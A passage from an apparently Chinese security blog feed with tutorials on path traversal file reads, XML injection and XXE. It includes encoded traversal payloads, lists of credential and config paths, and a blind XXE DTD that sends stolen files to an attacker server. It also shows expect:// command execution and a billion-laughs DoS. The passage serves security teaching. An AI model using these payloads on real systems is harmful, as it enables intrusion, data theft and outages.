class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>二次编码(<span class="hljs-variable">%25</span>)<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>加入+<br>?filename<span class="hljs-operator">=</span>.+./.+./bin/redacted.dll<br><span class="hljs-variable">%00</span><br>?filename<span class="hljs-operator">=</span>.<span class="hljs-variable">%00</span>./file.php/etc/passwd<span class="hljs-variable">%00</span>.jpg<br>\<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>/windows/win.iniJava <br><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span> 安全模式绕过<br>?filename<span class="hljs-operator">=</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="linux下的常见利用姿势">Linux下的常见利用姿势</h3><h4 id="用户目录下的敏感文件">用户目录下的敏感文件</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure><p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p><h4 id="全路径">全路径</h4><p>mlocate.db数据库里存储了本地所有文件的配置信息<code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<code>locate mlocate.db config</code><code>locate mlocate.db webapps</code><code>locate mlocate.db www</code></p><p>获取到路径后可以进一步挖掘敏感信息和系统漏洞</p><h4 id="程序源代码">程序源代码</h4><p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF/web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p><h4 id="应用配置文件">应用配置文件</h4><p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p><ul><li>java站点 <code>/WEB-INF/web.xml</code><code>/WEB-INF/classes/applicationContext.xml</code><code>/WEB-INF/classes/xxx/xxx/xxx.class</code><code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat <code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx <code>/www/nginx/conf/nginx.conf</code><code>/etc/nginx/nginx.conf</code><code>/usr/local/nginx/conf/nginx.conf</code><code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache <code>/etc/httpd/conf/httpd.conf</code><code>/etc/apache2/apache2.conf</code><code>/etc/apache2/httpd.conf</code></li><li>redis <code>/etc/redis.conf</code></li><li>ssh <code>/etc/ssh/sshd_config</code></li></ul><h4 id="应用日志文件">应用日志文件</h4><p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p><ul><li>tomcat可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径<code>/webapps/ROOT/logs/catalina.out</code></li><li>apache <code>/var/log/apache2/access.log</code><code>/var/log/apache2/error.log</code><code>/var/log/httpd/access_log</code><code>/etc/httpd/logs/access_log</code><code>/etc/httpd/logs/error_log</code><code>/etc/httpd/logs/error.log</code></li><li>nginx <code>/var/log/nginx/access.log</code><code>/var/log/nginx/error.log</code><code>/usr/local/var/log/nginx/access.log</code><code>/usr/local/nginx/logs</code></li></ul><h3 id="windows下的利用姿势">Windows下的利用姿势</h3><h4 id="盲读取桌面文件">盲读取桌面文件</h4><p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件包含</tag>
      
      <tag>lfi</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误。" data-whm="此文章不能被修改。">  <script id="hbeData" type="hbeData" data-hmacdigest="eb116ffb528aa0b6a0a03e2e546e7d602640c055faab6ea4dacac5fc99a4248f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">本文参考了他人的文章但找不到出处，故加密。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML漏洞</title>
    <link href="/2023/01/01/XML%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XML%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="xml漏洞">XML漏洞</h1><h2 id="xml格式">XML格式</h2><blockquote><p>XML被设计用来传输和存储数据，其焦点是数据的内容。</p></blockquote><p>首先了解XML(可扩展标记语言) 基本格式（内部DTD）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;                              &lt;!--xml文件的声明--&gt;<br>&lt;!DOCTYPE note [                                   &lt;!--定义此文档是 note 类型的文档--&gt;<br>&lt;!ELEMENT note (to,from,heading,body)&gt;             &lt;!--定义note元素有四个元素--&gt;<br>&lt;!ELEMENT to (#PCDATA)&gt;                            &lt;!--定义to元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT from (#PCDATA)&gt;                          &lt;!--定义from元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT head (#PCDATA)&gt;                          &lt;!--定义head元素为”#PCDATA”类型--&gt;<br>&lt;!ELEMENT body (#PCDATA)&gt;                          &lt;!--定义body元素为”#PCDATA”类型--&gt;<br>]&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br></code></pre></td></tr></table></figure><p>总的来说</p><p>第一部分：XML声明</p><p>第二部分：文档类型定义DTD //漏洞一般在此出现</p><p>第三部分：文档元素</p><h2 id="dtd">DTD</h2><blockquote><p>DTD：用来约束XML文档定义语义约束分类</p></blockquote><h3 id="内部dtd">内部DTD</h3><h3 id="外部dtd">外部DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt;<br><br>example:<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt;<br>&lt;note&gt;<br>    &lt;to&gt;Y0u&lt;/to&gt;<br>    &lt;from&gt;@re&lt;/from&gt;<br>    &lt;head&gt;v3ry&lt;/head&gt;<br>    &lt;body&gt;g00d!&lt;/body&gt;<br>&lt;/note&gt;<br><br></code></pre></td></tr></table></figure><h3 id="公共dtd">公共DTD</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="dtd实体">DTD实体</h2><blockquote><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p></blockquote><p>按实体有无参分类</p><h3 id="一般实体"><strong>一般实体</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>&amp;实体名称;<br></code></pre></td></tr></table></figure><h3 id="参数实体">参数实体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">声明<br>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;<br>引用方法<br>%实体名称;<br></code></pre></td></tr></table></figure><p>按实体使用方式分类</p><pre><code class="hljs">1. 内部实体</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>外部实体</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br><br>example:<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY writer &quot;Dawn&quot;&gt;<br>    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;writer;©right;&lt;/test&gt;<br></code></pre></td></tr></table></figure><p>根据不同语言有以下可支持的协议：</p><figure><img src="/img/XML漏洞_img/clip_image002-16969084628491.gif"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="xml注入">XML注入</h2><h3 id="原理">原理</h3><p>与sql闭合类似，闭合标签达到更改、添加数据的效果</p><p>前提条件</p><pre><code class="hljs">1. 用户能够控制数据的输入1. 程序有拼凑的数据</code></pre><h3 id="example">example</h3><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注入payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>server接收结果</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manager</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>zhangsa<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>hack<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">manager</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就通过XML注入添加了一个名为<code>hack</code>，密码为<code>hacker</code>的管理员账户。XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h2 id="xxe漏洞">XXE漏洞</h2><h3 id="原理-1">原理</h3><p><strong>外部引用</strong>可以支持http，file，ftp等协议如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞攻击者可以构造一个XML文档，文档里引用外部实体通过协议进行读取文件等操作例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">一般实体+外部实体<br>&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [    <br>    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br><br>参数实体+外部实体<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE test [  <br>    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>    %file;<br>]&gt;<br></code></pre></td></tr></table></figure><h3 id="利用条件">利用条件</h3><p>php中解析xml用的是libxml库</p><p>版本&lt;=2.9.0的php中</p><p>simplexml_load_string()函数将正确的XML字符转化为php中的SimpleXMLElement对象</p><p>而&gt;2.9.0的，默认是禁止解析xml外部实体内容的</p><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致攻击者可以构造一个恶意的XML</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>hosts <span class="hljs-comment">#主机名和ip配置文件</span><br><span class="hljs-regexp">/proc/</span>net/arp <span class="hljs-comment">#流量包的信息</span><br><span class="hljs-regexp">/proc/</span>net/tcp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/udp <span class="hljs-comment">#活动连接的信息</span><br><span class="hljs-regexp">/proc/</span>net/dev <span class="hljs-comment">#提供给用户读取或更改网络适配器及统计信息</span><br><span class="hljs-regexp">/proc/</span>net/fib_trie <span class="hljs-comment">#路由缓存</span><br></code></pre></td></tr></table></figure><h3 id="xxe攻击类别及实例">XXE攻击类别及实例</h3><ol type="1"><li>有回显</li></ol><p>可以用下面的两种方式：</p><ul><li>直接使用外部实体调用<code>file://</code>、<code>php://filter/read=convert.base64-encode/resource=</code>等函数去读取本地文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?</span>xml version = <span class="hljs-string">&quot;1.0&quot;</span> encoding = <span class="hljs-string">&quot;utf-8&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;<br>]&gt;<br>&lt;test&gt;&amp;file;&lt;/test&gt;<br></code></pre></td></tr></table></figure><ul><li>将外部实体引用的 URL 设置到本地服务器，本地构建恶意 dtd文件，远程注入</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE any [    <br>    &lt;!ENTITY file SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;<br>%file;]&gt;<br>&lt;test&gt;&amp;evil;&lt;/test&gt;<br>    <br>//外部dtd内容   <br>&lt;!ENTITY evil SYSTEM &quot;file:///etc/passwd&quot; &gt;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>无回显</li></ol><p>Blind XXE外带，建立dtd文件进行远程协议调用文件</p><p>Blind XXE原理</p><p>先在受害机调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</p><p>再调用<code>evil.dtd</code>中的<code>%file</code>。<code>%file</code>获取受害机上面的敏感文件，然后将<code>%file</code>的返回结果传到<code>%send</code>。</p><p>然后受害机调用<code>%send</code>把读取到的数据发送到远程服务器上。</p><p>假设攻击机ip为：<code>192.168.201.128</code></p><p>vps上部署evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.201.128/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/qwzf.txt&quot;&gt;<br>    &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.201.128/evil.dtd&quot;&gt;<br>    %dtd;<br>    %send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(apache日志记录)</p><p>攻击机上：<code>tail -f /var/log/apache2/access.log</code></p><h3 id="特殊协议攻击">特殊协议攻击</h3><h4 id="执行系统命令">执行系统命令</h4><p>条件：在安装expect扩展的PHP环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h4 id="ddos">ddos</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt;<br>&lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;<br>&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;<br>&lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;<br>&lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;<br>&lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;<br>&lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;<br>&lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;<br>&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></code></pre></td></tr></table></figure><h4 id="探测内网端口">探测内网端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE xxe [<br>&lt;!ELEMENT name ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt;<br>]&gt;<br>&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;<br></code></pre></td></tr></table></figure><h2 id="xpath注入">xpath注入</h2><h3 id="原理-2">原理</h3><p>XPath 注入利用 XPath解析器的松散输入和容错特性，能够在URL、表单或其它信息上附带恶意的XPath查询代码，以获得高权限信息的访问权，类似于SQL注入。</p><p>注入对象是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code>，<code>parameters/input</code>等</p><h3 id="example-1">example</h3><p>test.xml(用于存储username和password)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 